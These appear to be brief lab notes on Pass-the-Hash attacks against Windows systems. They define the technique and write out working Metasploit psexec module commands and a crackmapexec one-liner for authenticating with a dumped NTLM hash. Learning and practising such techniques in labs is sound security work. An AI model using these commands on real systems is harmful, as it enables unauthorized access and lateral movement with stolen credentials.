Pass-the-Hash

Pass-the-Hash is an **exploitation technique** where an attacker:

- Captures or dumps **NTLM password hashes**
- Uses the hash directly to **authenticate to a system**
- Does NOT need the actual password

We can use multiple tools to facilitate a pass the hash attack:
- Metasploit Psexec module
- Crackmapexec


Lab demonstration
ctrl  + z
search psexec
use exploit/windows/smb/psexec
show options
set RHOSTS <target-ip>
set LPORT 4442
set SMBUser administrator
set SMBPass <paste-the-hash>
set target Native\ upload
run


Option 2
Using crackmapexec

crackmapexec smb <target-ip> -u administrator -H <'hash'>
